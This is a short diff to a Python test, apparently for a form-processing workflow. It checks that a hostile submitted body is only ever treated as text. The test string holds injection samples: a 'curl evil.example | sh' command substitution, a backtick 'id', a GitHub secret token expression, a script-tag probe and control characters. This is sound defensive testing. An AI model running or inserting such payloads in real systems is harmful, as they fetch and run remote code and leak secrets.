@@ -122,7 +122,7 @@ def test_bad_fields_change_nothing(root, fields, reason):
 
 
 def test_a_hostile_body_is_only_ever_text(root):
-    nasty = "$(curl evil.example | sh) `id` ${{ secrets.GITHUB_TOKEN }} <script>alert(1)</script> \x00\x1b[31m‮" + "A" * 5000
+    nasty = "$(curl evil.example | sh) `id` ${{ secrets.GITHUB_TOKEN }} <script>alert(1)</script> \x00\x1b[31m" + chr(0x202e) + "A" * 5000
     changed, _ = rv.run(event(form(checked=nasty, notes="### Build id\n\nev3-crank-ev3_motors")), root, no_fetch)
     assert changed
     record = records(root)[0]
